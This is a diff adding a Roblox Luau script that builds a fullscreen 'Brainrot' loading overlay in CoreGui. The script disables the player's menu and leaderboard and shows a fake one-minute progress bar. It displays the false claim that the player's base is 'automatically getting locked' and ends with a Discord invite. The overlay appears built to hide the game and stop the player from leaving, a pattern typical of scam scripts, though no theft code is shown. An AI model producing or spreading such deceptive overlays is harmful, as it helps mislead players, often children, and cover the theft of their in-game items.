@@ -1,0 +1,146 @@
+-- 🧠 Fullscreen Brainrot Loading Screen (Final)
+--!strict
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local ReplicatedFirst = game:GetService("ReplicatedFirst")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+
+-- Disable all CoreGui (menu, leaderboard, etc.)
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+ReplicatedFirst:RemoveDefaultLoadingScreen()
+local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
+
+--== GUI Setup ==--
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "BrainrotLoadingScreen"
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = CoreGui
+
+local Background = Instance.new("Frame")
+Background.Size = UDim2.new(1, 0, 1, 0)
+Background.Position = UDim2.new(0, 0, 0, 0)
+Background.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Background.BorderColor3 = Color3.fromRGB(255, 255, 255)
+Background.BorderSizePixel = 1
+Background.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 0)
+UICorner.Parent = Background
+
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Text = "Wait for this to load!"
+Title.Size = UDim2.new(1, 0, 0, 60)
+Title.Position = UDim2.new(0, 0, 0.2, 0)
+Title.BackgroundTransparency = 1
+Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+Title.Font = Enum.Font.GothamBold
+Title.TextScaled = false
+Title.TextSize = 48
+Title.Parent = Background
+
+-- Subtitle / Status (smaller)
+local StatusText = Instance.new("TextLabel")
+StatusText.Text = "Don't worry, your base is automatically getting locked."
+StatusText.Size = UDim2.new(1, -40, 0, 28)
+StatusText.Position = UDim2.new(0, 20, 0.2, 80)
+StatusText.BackgroundTransparency = 1
+StatusText.TextColor3 = Color3.fromRGB(255, 255, 255)
+StatusText.Font = Enum.Font.Gotham
+StatusText.TextScaled = true
+StatusText.TextWrapped = true
+StatusText.Parent = Background
+
+--== Progress Bar ==--
+local ProgressFrame = Instance.new("Frame")
+ProgressFrame.Size = UDim2.new(0.6, 0, 0, 30)
+ProgressFrame.Position = UDim2.new(0.2, 0, 0.7, 0)
+ProgressFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+ProgressFrame.BorderSizePixel = 0
+ProgressFrame.Parent = Background
+
+local ProgressCorner = Instance.new("UICorner")
+ProgressCorner.CornerRadius = UDim.new(0, 10)
+ProgressCorner.Parent = ProgressFrame
+
+local Fill = Instance.new("Frame")
+Fill.Size = UDim2.new(0, 0, 1, 0)
+Fill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Fill.BorderSizePixel = 0
+Fill.Parent = ProgressFrame
+
+local FillCorner = Instance.new("UICorner")
+FillCorner.CornerRadius = UDim.new(0, 10)
+FillCorner.Parent = Fill
+
+local PercentText = Instance.new("TextLabel")
+PercentText.Size = UDim2.new(1, 0, 1, 0)
+PercentText.BackgroundTransparency = 1
+PercentText.Text = "0%"
+PercentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+PercentText.Font = Enum.Font.GothamSemibold
+PercentText.TextScaled = true
+PercentText.Parent = ProgressFrame
+
+--== Spinner ==--
+local Spinner = Instance.new("Frame")
+Spinner.Size = UDim2.new(0, 40, 0, 40)
+Spinner.Position = UDim2.new(0.5, -20, 0.55, 0)
+Spinner.BackgroundTransparency = 1
+Spinner.Parent = Background
+
+local spinnerDots = {}
+for i = 1, 10 do
+	local d = Instance.new("Frame")
+	d.Size = UDim2.new(0, 8, 0, 8)
+	d.Position = UDim2.new(0.5, math.cos(math.rad(i * 36)) * 20 - 4, 0.5, math.sin(math.rad(i * 36)) * 20 - 4)
+	d.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+	d.BorderSizePixel = 0
+	d.Parent = Spinner
+	table.insert(spinnerDots, d)
+end
+
+task.spawn(function()
+	local index = 1
+	while ScreenGui.Parent do
+		for i, d in ipairs(spinnerDots) do
+			d.BackgroundTransparency = (i == index) and 0 or 0.8
+		end
+		index = (index % #spinnerDots) + 1
+		task.wait(0.08)
+	end
+end)
+
+--== Progress ==--
+local startTime = tick()
+local totalTime = 60 -- 1 minute
+RunService.RenderStepped:Connect(function()
+	local elapsed = tick() - startTime
+	local progress = math.clamp(elapsed / totalTime, 0, 1)
+	Fill.Size = UDim2.new(progress, 0, 1, 0)
+	PercentText.Text = string.format("%d%%", math.floor(progress * 100))
+end)
+
+--== Remove the loading screen automatically after 1 minute ==
+task.delay(60, function()
+	if ScreenGui and ScreenGui.Parent then
+		ScreenGui:Destroy()
+	end
+end)
+
+-- Discord link (optional)
+local DiscordText = Instance.new("TextLabel")
+DiscordText.Size = UDim2.new(1, 0, 0, 24)
+DiscordText.Position = UDim2.new(0, 0, 0.95, 0)
+DiscordText.BackgroundTransparency = 1
+DiscordText.Text = "discord.gg/frwk2b48xM"
+DiscordText.TextColor3 = Color3.fromRGB(200,200,200)
+DiscordText.Font = Enum.Font.Gotham
+DiscordText.TextScaled = true
+DiscordText.TextWrapped = true
+DiscordText.Parent = Background
